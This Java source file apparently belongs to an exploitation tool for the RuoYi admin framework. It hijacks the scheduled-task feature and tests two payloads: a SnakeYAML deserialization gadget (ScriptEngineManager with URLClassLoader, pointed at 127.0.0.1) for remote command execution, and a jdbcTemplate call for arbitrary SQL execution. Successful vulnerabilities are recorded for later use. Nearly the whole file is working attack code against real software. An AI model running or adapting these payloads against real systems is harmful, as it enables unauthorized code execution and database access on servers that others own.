package com.ruoyi.exp;

import com.ruoyi.global.Config;
import com.ruoyi.util.JobUtil;
import com.ruoyi.util.ResultUtil;
import java.util.List;

public class VulScan {


    public static void scan() {
        List<String> jobList = JobUtil.getList();
        if (jobList.isEmpty()) {
            ResultUtil.log("定时任务列表为空，新建任务...");
            JobUtil.createJob();
            jobList = JobUtil.getList();
            ResultUtil.log("绑定 JobId=" + jobList.get(0) + " 的定时任务");
        } else {
            ResultUtil.log("存在定时任务，绑定 JobId=" + jobList.get(0) + " 的定时任务");

        }
        Config.jobId = jobList.get(0);
        yamlTest();
        jdbcTest();
    }

    public static void yamlTest(){
        if(JobUtil.updateJob("org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1\"]]]]')")){
            ResultUtil.success("存在 snakeyaml 远程命令执行漏洞");
            Config.vulMode.add("snakeyaml");
        } else {
            ResultUtil.fail("不存在 snakeyaml 远程命令执行漏洞");
        }
    }

    public static void jdbcTest(){
        if(JobUtil.updateJob("jdbcTemplate.execute(\"select user()\")")){
            ResultUtil.success("存在 jdbcTemplate 任意sql语句执行漏洞");
            Config.vulMode.add("jdbc");
        } else {
            ResultUtil.fail("不存在 jdbcTemplate 任意sql语句执行漏洞");
        }
    }
}
